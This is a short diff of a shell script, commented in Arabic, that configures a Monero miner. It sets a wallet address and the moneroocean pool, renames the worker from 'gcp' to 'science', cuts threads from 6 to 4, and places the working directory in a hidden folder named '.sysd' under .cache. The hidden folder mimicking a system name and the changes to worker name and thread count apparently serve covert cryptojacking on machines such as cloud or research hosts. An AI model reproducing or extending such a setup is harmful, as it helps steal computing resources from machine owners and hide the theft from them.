@@ -2,9 +2,9 @@
 
 # إعداد بيانات المحفظة والمعدّن
 WALLET="88DcxveXeHaRDYLbmAxBuMZBsYwEtrDcb4EUWJvCQjKsNo2ieFTrBLNBhpVdFfLTXnRDcnJgg7Fpre43fbFMnfxkV2ZrpEm"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="gcp"
+WORKER="science"
 POOL="gulf.moneroocean.stream:443"
-THREADS=6
+THREADS=4
 # مجلد العمل
 WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
